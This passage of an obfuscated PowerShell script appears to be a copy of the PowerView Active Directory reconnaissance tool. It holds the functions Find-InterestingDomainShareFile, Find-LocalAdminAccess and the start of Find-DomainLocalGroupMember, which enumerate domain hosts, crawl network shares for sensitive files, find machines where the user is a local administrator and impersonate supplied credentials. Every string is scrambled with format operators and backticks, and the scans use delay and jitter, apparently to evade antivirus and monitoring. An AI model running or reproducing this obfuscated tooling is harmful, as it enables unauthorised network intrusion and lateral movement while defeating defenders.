        if (${p`s`BoUNDparaME`T`eRs}[("{3}{2}{1}{0}{4}"-f 'g','in','Operat','Computer','System')]) { ${cO`MpUt`erS`eArcHe`R`A`RGU`ME`NTS}[("{0}{3}{1}{2}" -f'Op','ratingSyst','em','e')] = ${O`P`ERAtINGSY`STEm} }
        if (${p`sBO`UNdPARAmET`ers}[("{0}{2}{3}{4}{1}{5}"-f'C','ePac','omp','uter','Servic','k')]) { ${CO`Mp`UtER`sEAR`CHerA`R`GUm`e`NtS}[("{0}{2}{1}"-f'Se','k','rvicePac')] = ${SERv`ICEP`A`Ck} }
        if (${p`SbOUNDPAra`MEt`eRS}[("{1}{2}{0}{4}{3}"-f'e','Compu','t','eName','rSit')]) { ${c`oMPUteRSeaRcH`E`Ra`RGU`MeNTs}[("{0}{2}{1}"-f'Si','eName','t')] = ${si`Tena`me} }
        if (${pSb`ouNdP`ARaMet`erS}[("{1}{2}{0}"-f'r','Se','rve')]) { ${coMpute`R`Se`ArCh`e`RArGUMe`NTS}[("{0}{2}{1}"-f'S','ver','er')] = ${Ser`V`Er} }
        if (${PSB`ou`NdpAraM`eT`eRS}[("{1}{0}{2}" -f 'Sc','Search','ope')]) { ${COM`pU`T`eRs`e`ArcHeRARguMenTs}[("{1}{0}{2}" -f 'hSco','Searc','pe')] = ${S`e`ArcHSCo`PE} }
        if (${pSbO`UNdpa`R`A`MEte`RS}[("{1}{0}{2}" -f 'PageSi','Result','ze')]) { ${CO`mPu`T`ErSE`A`RcHeRArgUmEnts}[("{2}{4}{1}{3}{0}" -f 'e','ltPageSi','Re','z','su')] = ${rEsU`LT`PaG`esIzE} }
        if (${P`S`Bo`UNd`ParAMeterS}[("{2}{3}{4}{1}{0}"-f'imit','L','Se','rve','rTime')]) { ${coMpU`T`eR`S`e`ArcHER`ArGUm`EntS}[("{2}{3}{1}{0}"-f'imit','imeL','S','erverT')] = ${se`Rver`TiME`lIMIT} }
        if (${pSBOun`D`P`ARAMeTeRS}[("{2}{1}{0}"-f 'ne','to','Tombs')]) { ${c`Omput`e`RseA`RC`H`eRaRGuMENts}[("{0}{1}{2}"-f'T','ombst','one')] = ${t`ombST`ONE} }
        if (${p`S`B`OuNDPAR`AmEte`Rs}[("{2}{1}{0}"-f'ential','red','C')]) { ${C`o`mPUteRsea`R`cH`e`RAr`GUmENtS}[("{1}{0}{3}{2}" -f 'red','C','ntial','e')] = ${c`REdentI`AL} }

        if (${p`s`BoUn`Dpa`RAmeTe`RS}[("{3}{0}{2}{1}"-f'om','Name','puter','C')]) {
            ${T`ARG`EtCOmP`UTERs} = ${C`oM`PuTE`RNAMe}
        }
        else {
            &("{1}{2}{0}" -f'e','W','rite-Verbos') ("{11}{7}{6}{0}{9}{2}{8}{5}{3}{1}{4}{10}"-f 'DomainSha',' computers in',']','ng',' the d','ueryi','esting','ind-Inter',' Q','reFile','omain','[F')
            ${T`A`RgETCOMPU`T`erS} = &("{0}{2}{4}{1}{3}" -f 'Get-D','e','o','r','mainComput') @ComputerSearcherArguments | &("{3}{2}{1}{0}{4}" -f'-Ob','lect','e','S','ject') -ExpandProperty ("{3}{2}{1}{0}"-f'e','am','shostn','dn')
        }
        &("{0}{1}{2}" -f 'Wr','ite-V','erbose') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${tArgEt`c`omp`Ut`ERS}."LE`NgTH" -eq 0) {
            throw ("{1}{5}{8}{2}{7}{3}{10}{6}{9}{4}{0}" -f 'to enumerate','[','restingDomainSh','reFi','found ','Find','e] No h','a','-Inte','osts ','l')
        }

        ${hoS`T`eNUMBloCK} = {
            Param(${COMpUTer`N`AMe}, ${I`NCLUDE}, ${EXClUdE`D`sHA`ReS}, ${o`FfiCE`Do`CS}, ${e`Xc`LuDE`HiDDEN}, ${fr`Esh`exeS}, ${CH`eCKW`Ri`Te`AC`cess}, ${t`oKenHaND`lE})

            if (${TOK`e`N`HAnDLe}) {

                ${N`Ull} = &("{4}{2}{0}{5}{1}{3}"-f 'e-U','r','k','Impersonation','Invo','se') -TokenHandle ${ToKEN`hA`Nd`le} -Quiet
            }

            ForEach (${TargetcO`mpu`T`ER} in ${c`ompUT`ERNAme}) {

                ${SEARc`HshA`R`eS} = @()
                if (${T`ArgetcOm`PutEr}.("{0}{1}{2}" -f'S','tartsW','ith').Invoke('\\')) {

                    ${sEaRch`SHAR`es} += ${t`ArGet`CoMP`UT`Er}
                }
                else {
                    ${U`p} = &("{3}{0}{2}{1}{4}"-f 't','ec','-Conn','Tes','tion') -Count 1 -Quiet -ComputerName ${taR`g`ETCOMp`UteR}
                    if (${u`p}) {

                        ${s`HarEs} = &("{0}{2}{1}" -f'Get','tShare','-Ne') -ComputerName ${TARGET`co`mP`UTer}
                        ForEach (${s`hare} in ${s`HA`ReS}) {
                            ${SH`Aren`AMe} = ${ShA`Re}."Na`ME"
                            ${pA`Th} = '\\'+${tarGeT`CoM`PUT`eR}+'\'+${ShaReN`A`ME}

                            if ((${S`HAre`NAMe}) -and (${SH`A`REnA`mE}.("{1}{0}"-f 'im','Tr').Invoke() -ne '')) {

                                if (${e`xCL`UDEdshA`RES} -NotContains ${s`H`ArEnamE}) {

                                    try {
                                        ${nu`ll} =  ( &("{2}{0}{1}"-f 'iab','LE','vaR') ("{1}{0}"-f'jqn7','X')  )."V`ALue"::("{2}{0}{1}" -f'e','tFiles','G').Invoke(${pA`TH})
                                        ${S`EaRcH`sh`ArES} += ${P`ATh}
                                    }
                                    catch {
                                        &("{0}{2}{1}{3}"-f 'Writ','Verbos','e-','e') ('[!]'+' '+'N'+'o '+'acce'+'ss '+'t'+'o '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${s`Ha`RE} in ${SeaR`chs`hAREs}) {
                    &("{4}{0}{1}{2}{3}"-f'r','ite-V','erb','ose','W') ('Se'+'a'+'rc'+'hing '+'shar'+'e'+': '+"$Share")
                    ${S`EARcH`Args} = @{
                        ("{0}{1}" -f'P','ath') = ${Sh`Are}
                        ("{1}{0}"-f'ude','Incl') = ${I`Nclu`DE}
                    }
                    if (${ofF`IcE`DOCS}) {
                        ${s`e`ARcHaR`gs}[("{1}{2}{0}"-f'eDocs','Of','fic')] = ${OFF`iCEd`O`CS}
                    }
                    if (${f`RE`ShE`XEs}) {
                        ${S`eAr`cHA`RgS}[("{0}{1}{2}{3}"-f'Fre','s','h','EXEs')] = ${freS`H`e`Xes}
                    }
                    if (${LAstacces`s`Ti`me}) {
                        ${S`ea`RcHarGS}[("{0}{1}{3}{2}"-f 'LastAcc','essT','e','im')] = ${LAstacC`e`SSTimE}
                    }
                    if (${L`A`sTWRITE`TiMe}) {
                        ${SEARcH`A`Rgs}[("{2}{0}{1}{3}"-f'Writ','eT','Last','ime')] = ${l`AS`T`wRITe`TIme}
                    }
                    if (${CREAtIO`N`Ti`Me}) {
                        ${Sea`RC`ha`RGs}[("{0}{1}{3}{2}"-f'Cre','ati','e','onTim')] = ${C`R`eATio`NTIME}
                    }
                    if (${chE`ck`Wri`Te`AC`CeSS}) {
                        ${S`EAr`Ch`ArGs}[("{3}{1}{2}{0}"-f 'ess','heckW','riteAcc','C')] = ${cheC`kW`RI`T`EacceSs}
                    }
                    &("{0}{2}{4}{5}{1}{3}" -f'Find','tingFi','-','le','Inter','es') @SearchArgs
                }
            }

            if (${TokE`NhA`Nd`le}) {
                &("{1}{2}{4}{0}{3}"-f'ertTo','Invo','k','Self','e-Rev')
            }
        }

        ${loG`o`Nt`OKEN} = ${nU`lL}
        if (${pSb`O`UnDp`ARAme`Te`Rs}[("{0}{2}{1}" -f'C','l','redentia')]) {
            if (${ps`BOundPA`RAme`TeRS}[("{1}{0}"-f'elay','D')] -or ${Ps`BOun`dpAr`AMEtErs}[("{2}{1}{0}" -f 's','pOnSucces','Sto')]) {
                ${l`OGONTO`KEN} = &("{0}{2}{3}{4}{6}{5}{1}"-f 'I','on','nv','oke-','Us','onati','erImpers') -Credential ${cr`Ed`en`Tial}
            }
            else {
                ${l`oGontok`eN} = &("{7}{6}{0}{3}{1}{5}{4}{2}" -f'-Use','pe','tion','rIm','ona','rs','e','Invok') -Credential ${CR`e`DeNTIAl} -Quiet
            }
        }
    }

    PROCESS {

        if (${PSb`OUN`DPa`RAM`eTERs}[("{1}{0}"-f'ay','Del')] -or ${PsbouNd`P`ArAMe`TeRs}[("{0}{2}{1}"-f'St','Success','opOn')]) {

            &("{1}{0}{2}"-f'-Ve','Write','rbose') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{2}{3}{0}{1}" -f 'e-Verb','ose','Wr','it') ('[Fi'+'nd-Int'+'e'+'resti'+'n'+'gDo'+'main'+'ShareFi'+'l'+'e] '+'Delay'+': '+"$Delay, "+'Jitte'+'r: '+"$Jitter")
            ${co`UN`TeR} = 0
            ${ra`NdNo} = &("{2}{1}{0}"-f 't','Objec','New-') ("{2}{0}{1}"-f'ando','m','System.R')

            ForEach (${t`A`RGet`c`OMpUtER} in ${ta`RgE`TCOM`PUTerS}) {
                ${C`Ou`NTeR} = ${cOUn`T`eR} + 1

                &("{1}{0}{2}{3}"-f'art-','St','Slee','p') -Seconds ${rA`NDNo}.("{1}{0}" -f 'xt','Ne').Invoke((1-${Ji`TtEr})*${deL`AY}, (1+${jI`T`Ter})*${d`E`LAY})

                &("{1}{2}{3}{0}"-f'e','Write-','Ver','bos') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{2}" -f'In','voke-','Command') -ScriptBlock ${hOs`TEnum`B`lOCK} -ArgumentList ${t`A`RgETCOmPUt`ER}, ${iN`cl`UDE}, ${eXCLu`deDSHa`ReS}, ${OFfi`ced`O`CS}, ${ExCLUd`Ehid`D`eN}, ${fRe`Sh`eXeS}, ${c`h`E`ckWRi`TeAC`cESs}, ${loG`oN`TokeN}
            }
        }
        else {
            &("{0}{2}{1}" -f 'Wri','bose','te-Ver') ('['+'Find-Int'+'ere'+'st'+'i'+'ngDo'+'main'+'ShareFi'+'le]'+' '+'Us'+'ing '+'t'+'hr'+'eading '+'with'+' '+'t'+'hr'+'eads: '+"$Threads")

            ${Scr`iP`TpArAMs} = @{
                ("{1}{0}" -f'ude','Incl') = ${Inc`LudE}
                ("{2}{3}{0}{1}" -f 'ha','res','Ex','cludedS') = ${eX`cLUdEDsh`AReS}
                ("{0}{1}{2}" -f 'OfficeD','o','cs') = ${o`FFI`Ced`OCs}
                ("{4}{2}{1}{0}{3}" -f'd','Hid','clude','en','Ex') = ${eXcl`UDeH`IddeN}
                ("{3}{1}{2}{0}"-f 'Es','res','hEX','F') = ${FR`e`sHE`Xes}
                ("{0}{4}{2}{1}{3}{5}" -f 'Ch','WriteA','ck','cc','e','ess') = ${C`h`ECkWRiTEaCC`eSs}
                ("{1}{2}{0}"-f'dle','T','okenHan') = ${log`ONT`Oken}
            }

            &("{2}{4}{3}{0}{1}" -f'ti','on','New-T','unc','hreadedF') -ComputerName ${tAR`Ge`TC`omput`eRs} -ScriptBlock ${hOs`T`en`UmblOcK} -ScriptParameters ${sCRi`ptP`Ara`MS} -Threads ${T`Hre`AdS}
        }
    }

    END {
        if (${Lo`G`O`NTokeN}) {
            &("{2}{3}{0}{1}"-f 'vertT','oSelf','Invok','e-Re') -TokenHandle ${LoG`o`NtOKeN}
        }
    }
}

function Fi`Nd-`LOcaLA`DMiN`AccesS {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}{4}"-f 'S','PS','houldProce','s','s'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(pOSITIOn = 0, vaLuefrOMPipelIne = ${t`RuE}, valueFROMPIpElInebYpropeRTyNamE = ${tr`UE})]
        [Alias({"{1}{2}{3}{0}"-f 'ame','DNSH','o','stN'})]
        [String[]]
        ${co`mPUt`ErN`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPu`TE`Rdom`A`iN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMp`U`Te`Rl`DaPFiltEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${com`P`Ut`e`RSE`ARCHBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Ope','em','ratingSyst'})]
        [String]
        ${c`OMp`Ute`RoPeRatin`gsY`S`Tem},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}"-f'c','ePack','ervi','S'})]
        [String]
        ${coMpUTEr`Se`R`ViCepacK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'teName','i','S'})]
        [String]
        ${COM`P`U`T`ErSitena`me},

        [Switch]
        ${cHe`CK`sharea`CcESS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}"-f 'Contro','ll','omain','D','er'})]
        [String]
        ${SErv`er},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{1}"-f'O','neLevel'}, {"{2}{0}{1}" -f 'r','ee','Subt'})]
        [String]
        ${S`eAr`CH`scOPE} = ("{0}{1}{2}"-f 'S','ubtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esul`TPa`G`eSiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVe`RTim`ElIMit},

        [Switch]
        ${t`Ombst`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdeNT`IAl} =  (  &("{1}{2}{0}" -f 'AbLe','Va','ri')  ('pkFE'+'zN') -vaLUE )::"E`mPTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${De`Lay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`ITT`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`hr`EAds} = 20
    )

    BEGIN {
        ${Comp`UTe`RsEar`C`HE`RaRGu`Men`Ts} = @{
            ("{1}{0}{2}"-f'pert','Pro','ies') = ("{2}{3}{1}{0}"-f 'me','na','dn','shost')
        }
        if (${Ps`BO`U`NdPar`AmETErs}[("{0}{1}{3}{2}"-f 'C','ompute','main','rDo')]) { ${c`OMP`U`T`Er`se`ArcheRaRGumentS}[("{1}{0}" -f'omain','D')] = ${c`oMP`Ute`RD`OMAIn} }
        if (${PsbouNd`PArA`ME`TErs}[("{0}{2}{1}{3}" -f 'ComputerL','t','DAPFil','er')]) { ${cOM`Pu`TE`RsEarchErAR`g`UM`ENtS}[("{2}{1}{3}{0}" -f 'er','A','LD','PFilt')] = ${co`mP`Uter`Ld`AP`FI`lTer} }
        if (${pSBOunDp`A`RAMe`Te`Rs}[("{2}{1}{0}{3}{5}{4}"-f'S','ter','Compu','earch','ase','B')]) { ${c`o`mpUte`RseARC`HerA`Rg`UMENts}[("{0}{2}{1}"-f'Searc','se','hBa')] = ${coMPuT`ERSE`Ar`cH`BASE} }
        if (${Ps`BO`UndP`ArAMete`Rs}[("{2}{0}{1}" -f'r','ained','Unconst')]) { ${CoMPUter`sEARcHE`R`Ar`G`UmENts}[("{2}{0}{1}{3}"-f 'cons','tra','Un','ined')] = ${U`NCO`N`strAINED} }
        if (${Ps`Bo`UnDPaRaMe`TERs}[("{3}{1}{0}{4}{2}{5}"-f 'p','erO','t','Comput','era','ingSystem')]) { ${ComP`UTe`R`seA`Rche`RaRgU`mENtS}[("{0}{2}{1}{3}" -f 'OperatingS','te','ys','m')] = ${O`pE`RaTingSys`TEm} }
        if (${pS`Bo`Un`DpAR`A`meTErs}[("{0}{2}{5}{4}{3}{1}" -f'C','ck','o','erServicePa','ut','mp')]) { ${com`pUt`ersE`ArCheRar`GUm`entS}[("{2}{1}{3}{0}"-f 'ck','vi','Ser','cePa')] = ${s`ErViCEp`A`ck} }
        if (${pS`B`o`UnDpaRAme`TERS}[("{1}{4}{0}{3}{2}" -f'puterSit','Co','me','eNa','m')]) { ${comPUt`e`R`SearCh`erARguM`eNTs}[("{0}{1}" -f'Site','Name')] = ${sitE`NAME} }
        if (${psboUnd`pAR`Ame`T`eRS}[("{0}{1}{2}"-f 'S','e','rver')]) { ${COmpu`TErs`Ea`R`cHE`RARGuMe`NTS}[("{0}{1}"-f'Ser','ver')] = ${SERV`eR} }
        if (${P`S`Boundp`ArAmEt`eRs}[("{0}{1}{3}{2}" -f'Sear','chSc','pe','o')]) { ${CoMPuteRsEarCH`E`R`ArgUMe`N`Ts}[("{1}{3}{2}{0}"-f 'e','S','p','earchSco')] = ${S`E`ARCH`scOPE} }
        if (${ps`Boun`DpARamE`Te`Rs}[("{2}{1}{4}{0}{3}" -f 'Pag','s','Re','eSize','ult')]) { ${c`om`PUtE`RsEArchErA`RGUmeNTs}[("{3}{4}{2}{1}{0}" -f 'ze','i','geS','Resu','ltPa')] = ${RE`SUl`TpAGE`SIze} }
        if (${p`sBO`UNDpar`AmETeRS}[("{2}{0}{1}{4}{3}" -f 'rver','Ti','Se','mit','meLi')]) { ${CoMPUT`Erse`ARCHerA`R`gu`Me`NtS}[("{2}{3}{4}{0}{1}"-f'eL','imit','S','erver','Tim')] = ${s`er`Ver`TIM`ELIMIT} }
        if (${pSbOUnd`PA`Ra`MeT`ERS}[("{0}{2}{1}" -f'Tom','one','bst')]) { ${Comp`UTE`R`sEaRc`hEra`Rg`U`MentS}[("{1}{2}{0}"-f 'stone','To','mb')] = ${tOm`B`sTo`Ne} }
        if (${PsbOunD`Par`A`MeteRs}[("{2}{0}{1}"-f'ti','al','Creden')]) { ${comp`Ut`Er`sea`RCHeRaRguMeNTs}[("{0}{2}{1}"-f 'Creden','l','tia')] = ${c`ReDE`NTIAl} }

        if (${Ps`BOun`dpArA`meTE`RS}[("{1}{2}{3}{0}" -f'e','C','ompute','rNam')]) {
            ${TarGet`c`OmPu`TERs} = ${cOMp`U`T`ern`AMe}
        }
        else {
            &("{2}{1}{0}{3}" -f'rb','e-Ve','Writ','ose') ("{12}{5}{11}{1}{14}{0}{3}{4}{15}{10}{6}{8}{13}{16}{9}{2}{7}"-f'nA','A','in the dom','cces','s','nd-Loca',' c','ain','om','s ','uerying','l','[Fi','pu','dmi','] Q','ter')
            ${T`A`RgEtcOmP`UT`ErS} = &("{2}{0}{4}{1}{3}"-f 'oma','ompu','Get-D','ter','inC') @ComputerSearcherArguments | &("{1}{2}{0}" -f 'ject','Select','-Ob') -ExpandProperty ("{3}{0}{1}{2}"-f's','hostnam','e','dn')
        }
        &("{3}{1}{4}{2}{0}"-f'ose','i','-Verb','Wr','te') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${taR`G`EtCOMpU`TE`RS}."L`Eng`Th" -eq 0) {
            throw ("{7}{6}{1}{0}{5}{8}{4}{3}{2}"-f 'cess] No hosts','dminAc','te',' enumera','o',' f','nd-LocalA','[Fi','ound t')
        }

        ${HO`StENum`B`LocK} = {
            Param(${cOMP`Uter`Na`ME}, ${t`oKENH`And`le})

            if (${tOKe`Nha`N`dLe}) {

                ${Nu`ll} = &("{3}{0}{2}{1}{6}{4}{5}"-f'UserIm','a','person','Invoke-','i','on','t') -TokenHandle ${T`o`kEn`HANDlE} -Quiet
            }

            ForEach (${T`A`RGE`TCoMpUteR} in ${cO`m`PuT`ERNAMe}) {
                ${Up} = &("{3}{2}{4}{1}{0}" -f'n','o','ect','Test-Conn','i') -Count 1 -Quiet -ComputerName ${TAR`GeT`CoM`pU`Ter}
                if (${Up}) {

                    ${A`CceSs} = &("{3}{2}{1}{0}" -f's','AdminAcces','st-','Te') -ComputerName ${tAr`G`E`TC`OMPUter}
                    if (${aC`CE`Ss}."is`ADm`IN") {
                        ${T`ARGET`COm`PUt`eR}
                    }
                }
            }

            if (${t`OK`e`NhaNDLe}) {
                &("{1}{0}{3}{2}" -f 'Revert','Invoke-','Self','To')
            }
        }

        ${L`o`gOnt`OKen} = ${n`UlL}
        if (${Ps`BO`Und`ParAMETe`RS}[("{2}{1}{0}" -f 'al','denti','Cre')]) {
            if (${p`SBoU`N`DPaR`AmeTeRs}[("{0}{1}" -f 'De','lay')] -or ${PsBOU`Nd`p`ArAMEtE`RS}[("{2}{0}{1}" -f 'topOnS','uccess','S')]) {
                ${LOG`onTo`ken} = &("{3}{2}{4}{0}{7}{6}{1}{5}"-f 'I','sona','e-U','Invok','ser','tion','er','mp') -Credential ${C`REdEN`TIAl}
            }
            else {
                ${l`ogoNTo`kEn} = &("{4}{1}{5}{3}{2}{0}"-f'n','nv','io','serImpersonat','I','oke-U') -Credential ${Cr`eden`TIaL} -Quiet
            }
        }
    }

    PROCESS {

        if (${Ps`BoU`NDPar`AMeTe`RS}[("{1}{0}"-f'ay','Del')] -or ${P`sBoUNDPa`R`AMe`T`Ers}[("{4}{2}{3}{1}{0}" -f'ccess','nSu','to','pO','S')]) {

            &("{0}{3}{2}{1}{4}" -f 'Wri','s','o','te-Verb','e') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{4}{3}{0}{1}{2}" -f 'Verb','os','e','-','Write') ('[Fin'+'d'+'-'+'L'+'ocalAdminAcc'+'ess] '+'Dela'+'y'+': '+"$Delay, "+'Ji'+'tte'+'r: '+"$Jitter")
            ${cOunT`er} = 0
            ${rA`NDno} = &("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{0}{3}{1}{2}" -f'Sy','Ra','ndom','stem.')

            ForEach (${tA`Rget`COm`puT`eR} in ${Target`COmPu`TErS}) {
                ${Coun`T`ER} = ${c`ount`Er} + 1

                &("{1}{0}{3}{2}"-f 't-Sle','Star','p','e') -Seconds ${R`And`NO}.("{1}{0}"-f 'ext','N').Invoke((1-${JiT`T`er})*${d`ElAY}, (1+${j`It`TEr})*${de`L`Ay})

                &("{3}{2}{1}{0}"-f 'bose','-Ver','rite','W') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{4}{0}{2}{3}" -f'voke-Comm','I','an','d','n') -ScriptBlock ${hoS`TenUm`BLock} -ArgumentList ${t`ArG`eTc`oMpuT`Er}, ${LO`G`on`Token}
            }
        }
        else {
            &("{0}{3}{2}{1}" -f'Wri','se','erbo','te-V') ('['+'Fin'+'d-Lo'+'calAdm'+'inAcces'+'s]'+' '+'Using'+' '+'thre'+'ading'+' '+'w'+'ith '+'th'+'rea'+'ds: '+"$Threads")

            ${Sc`Rip`TparA`Ms} = @{
                ("{0}{1}{2}" -f'Toke','nHandl','e') = ${L`ogONtO`k`En}
            }

            &("{1}{5}{3}{2}{0}{4}" -f'Functi','Ne','d','ade','on','w-Thre') -ComputerName ${TaRge`T`co`MpUTers} -ScriptBlock ${HoStE`NUmb`L`oCK} -ScriptParameters ${scrI`pTpA`RAMs} -Threads ${THRE`A`DS}
        }
    }
}

function fI`ND-dOmAIn`LO`C`ALGR`oUPM`emb`er {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{0}{3}"-f's','Pr','PSShould','s','oce'}, '')]
    [OutputType({"{5}{1}{3}{4}{7}{6}{0}{2}" -f'.AP','rView.Loca','I','lG','rou','Powe','r','pMembe'})]
    [OutputType({"{2}{5}{6}{1}{3}{0}{4}" -f'emb','lGro','Power','upM','er.WinNT','View.Loc','a'})]
    Param(
        [Parameter(POsITioN = 0, ValUEfrOmPIPeLinE = ${TR`Ue}, vALueFroMpipEliNebYprOperTYNaME = ${TR`UE})]
        [Alias({"{2}{0}{3}{1}" -f'S','ostName','DN','H'})]
        [String[]]
        ${cOmp`UtE`RnA`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMP`Ute`RdOmAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMpu`T`ERl`Da`pfiL`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mpuTERSEAr`c`hBase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{4}{3}" -f'peratin','O','gSyst','m','e'})]
        [String]
        ${cOMPute`R`O`perat`IngSY`St`eM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'icePack','erv','S'})]
        [String]
        ${COMPUter`serv`ICEPA`Ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'S','iteName'})]
        [String]
        ${c`o`m`putErSite`NAME},

        [Parameter(valUEfROmPipeLiNebYPrOpErTYNaME = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Gr`OU`PnamE} = ("{3}{0}{1}{2}" -f 'dministrat','or','s','A'),

        [ValidateSet('API', {"{0}{1}"-f 'Win','NT'})]
        [Alias({"{3}{4}{2}{1}{0}" -f'hod','et','ectionM','Col','l'})]
        [String]
        ${M`eTHOd} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}{4}" -f'Doma','tr','inCon','o','ller'})]
        [String]
        ${S`Er`VEr},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{0}"-f'vel','OneLe'}, {"{0}{1}{2}" -f 'Sub','t','ree'})]
        [String]
        ${se`ARc`HscopE} = ("{1}{2}{0}"-f 'tree','S','ub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`SuLt`PAg`eSize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRv`ERti`mELI`MIT},

        [Switch]
        ${TOM`BSTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`DeNtiaL} =   ${Pkf`EZN}::"e`MpTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${del`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Ji`T`Ter} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${Th`R`EADs} = 20
    )

    BEGIN {
        ${c`o`mP`Ut`e`Rsearc`HER`ArgUmeN`TS} = @{
            ("{1}{0}{2}" -f 'i','Propert','es') = ("{1}{2}{0}" -f'me','dnsh','ostna')
        }
        if (${P`sBou`N`dp`ARAME`TERS}[("{0}{1}{3}{2}"-f 'Co','mpute','omain','rD')]) { ${CoMPUtE`Rse`A`Rc`Hera`RGU`mENTs}[("{0}{1}" -f'Dom','ain')] = ${c`omP`UT`ErDOmain} }
        if (${p`sbOUNdp`ARamet`eRs}[("{3}{4}{2}{1}{0}"-f'lter','i','DAPF','Comp','uterL')]) { ${COmPuTerSE`AR`c`HErARG`U`Me`N`Ts}[("{1}{0}{2}" -f 'DAPFilte','L','r')] = ${CoMP`UterLd`Apfil`TEr} }
        if (${psBounD`PaR`A`Mete`RS}[("{3}{2}{1}{0}"-f'earchBase','S','ter','Compu')]) { ${COmP`UTe`Rs`eARc`heRArGUmEntS}[("{2}{1}{0}{3}" -f'c','r','Sea','hBase')] = ${CoMP`Ut`ERSEaRC`Hb`Ase} }
        if (${PsbounDP`Aram`e`TeRs}[("{3}{0}{2}{1}"-f'co','ined','nstra','Un')]) { ${cOmpUteRSE`ArChERAr`g`UmEN`Ts}[("{1}{0}{2}" -f'nstraine','Unco','d')] = ${UNcoNStRai`N`Ed} }
        if (${PsBoUn`d`pa`RAmete`RS}[("{1}{0}{4}{3}{2}"-f'omput','C','m','ingSyste','erOperat')]) { ${comPu`TE`R`s`eAr`chE`RAR`gUm`enTS}[("{4}{1}{3}{2}{0}" -f'em','in','st','gSy','Operat')] = ${OpeRATin`gsY`S`Tem} }
        if (${p`s`BoUNdpaR`A`MetERS}[("{2}{3}{0}{1}" -f'cePac','k','Co','mputerServi')]) { ${COMP`UTE`R`sE`ArcH`er`Argume`N`Ts}[("{0}{2}{1}"-f 'Servic','Pack','e')] = ${s`eRVIceP`A`ck} }
        if (${pSbo`Un`DPAr`A`meters}[("{0}{1}{3}{4}{2}"-f'C','om','e','p','uterSiteNam')]) { ${C`oM`PUTE`RSearC`H`ERAR`g`UM`enTS}[("{0}{1}" -f'Site','Name')] = ${SiTEN`A`me} }
        if (${PS`BoUn`dp`AramEteRS}[("{0}{1}" -f'Serve','r')]) { ${COMPU`TErse`ArC`He`RA`RG`UMeNtS}[("{2}{0}{1}" -f 'rve','r','Se')] = ${SErV`eR} }
        if (${PSBO`UnDPARa`M`eT`e`Rs}[("{0}{1}{2}" -f 'Sear','chS','cope')]) { ${comPuTE`RS`E`Arc`He`RaRgumENts}[("{0}{1}{2}"-f 'S','earchSco','pe')] = ${sEA`R`chscO`pE} }
        if (${P`SbOunD`pArAMe`TERS}[("{3}{1}{2}{0}{4}" -f 'eSi','esu','ltPag','R','ze')]) { ${COM`pute`RsE`A`RcHErA`RGuMEntS}[("{2}{1}{0}{3}" -f'i','S','ResultPage','ze')] = ${R`Esu`ltPa`gEsi`Ze} }
        if (${p`sBOUNd`pa`RAMetE`Rs}[("{1}{0}{2}{4}{3}" -f'ver','Ser','TimeL','it','im')]) { ${c`OMpUTE`RseArcH`ERA`RGU`me`NtS}[("{3}{1}{2}{0}{4}" -f'eLim','rv','erTim','Se','it')] = ${se`RVertIMeL`iM`iT} }
        if (${P`s`BoUN`dpArA`meterS}[("{2}{0}{1}"-f'sto','ne','Tomb')]) { ${CoM`P`UTer`SEa`RCHeRarg`UMe`NTs}[("{1}{0}"-f'mbstone','To')] = ${ToM`BS`ToNe} }
        if (${P`sb`oun`DParaMEtErs}[("{2}{0}{1}"-f 'red','ential','C')]) { ${CoMpu`TeRs`Ea`Rcher`ARguMeN`TS}[("{3}{2}{0}{1}"-f'ia','l','edent','Cr')] = ${c`R`EDeN`TiaL} }

        if (${PsbO`UNd`p`A`R`AmEtErs}[("{0}{2}{1}{3}"-f'Comput','am','erN','e')]) {
            ${tar`G`etcO`m`PuTErs} = ${c`omPUTErN`Ame}
        }
        else {
